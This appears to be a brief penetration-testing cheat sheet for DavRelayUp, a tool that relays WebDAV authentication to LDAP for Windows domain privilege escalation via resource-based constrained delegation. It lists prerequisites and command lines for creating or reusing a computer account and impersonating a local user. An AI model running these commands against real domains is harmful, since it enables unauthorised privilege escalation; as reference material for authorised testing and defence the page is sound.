# DavRelayUp

Link: https://github.com/Dec0ne/DavRelayUp

## Requirements: Valid domain credentials. LDAP signing is not enforced.

Works similar to KrbRelayUp, but relay from WebDAV to LDAP

##### Create a new computer account to perform RBCD

    ./DavRelayUp.exe -c

##### Use an existing computer account

    ./DavRelayUp.exe -cn <computer_name> -cp <computer_password>

##### Impersonate another local user than Administrator

    ./DavRelayUp.exe -c -i user1

##### Start WebDAV on another port than the default 55555

    ./DavRelayUp.exe -c -p 1234
